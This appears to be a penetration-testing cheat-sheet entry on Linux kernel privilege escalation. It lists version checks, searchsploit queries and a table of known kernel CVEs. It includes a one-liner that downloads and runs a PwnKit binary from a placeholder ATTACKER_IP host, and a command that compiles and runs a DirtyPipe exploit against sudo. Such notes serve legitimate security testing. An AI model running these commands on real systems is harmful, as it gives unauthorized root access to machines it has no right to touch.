---
id: linux-kernel
title: Linux Kernel Exploits
stage: privesc
tags: [linux]
tools:
  - uname -a
  - searchsploit linux kernel
  - /tmp/PwnKit
leads_to:
  - root-linux
---

## Check Kernel Version

```bash
uname -a
cat /etc/os-release
```

## Search for Exploits

```bash
searchsploit "linux kernel $(uname -r)"
searchsploit linux 5.8 local privilege escalation
```

## Common Exploits

| CVE | Kernel | Notes |
|---|---|---|
| CVE-2021-4034 (PwnKit) | Most Linux < Jan 2022 | pkexec SUID — extremely reliable |
| CVE-2022-0847 (DirtyPipe) | 5.8 – 5.16 | Write to read-only files |
| CVE-2021-3493 (overlayfs) | Ubuntu-specific | |
| CVE-2016-5195 (Dirty Cow) | < 4.8.3 | |

## PwnKit (most reliable — try first)

```bash
wget http://ATTACKER_IP:8000/PwnKit -O /tmp/pwn && chmod +x /tmp/pwn && /tmp/pwn
```

## DirtyPipe

```bash
# Compile on target (if gcc available) or transfer pre-compiled
gcc -o /tmp/dpipe exploit.c && /tmp/dpipe /usr/bin/sudo
```

## Notes

Kernel exploits are last resort — they can crash the machine. PwnKit (CVE-2021-4034) targets pkexec and is extremely stable across distributions. Always try sudo, SUID, cron, and cred hunting before reaching for kernel exploits.
